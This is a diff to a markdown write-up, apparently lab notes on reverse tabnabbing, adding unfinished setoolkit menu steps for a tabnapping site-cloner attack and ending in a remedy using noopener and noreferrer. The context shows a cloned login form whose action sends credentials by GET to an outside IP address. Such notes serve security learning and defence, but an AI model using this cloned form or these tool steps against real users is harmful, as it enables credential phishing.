@@ -93,6 +93,19 @@ Note I changed the POST to a GET request for ease.
 ```
 <form class="form-signin" action="//10.10.14.148:8074" method="get">
 ```
+
+## Auto tab napping (setoolkit)
+
+1. Open setoolkit
+2. From main menu choose 1) Social engineering attacks
+3. From main menu choose 2) website attack vectors
+4. Choose 4 for Tabnapping
+5. Choose 2 for site cloner
+6. 
+
+
+
+
 ## Remedy the issue. 
 
 The fix is very simple by adding ```noopenerand noreferrertags``` to the href elements on the page:
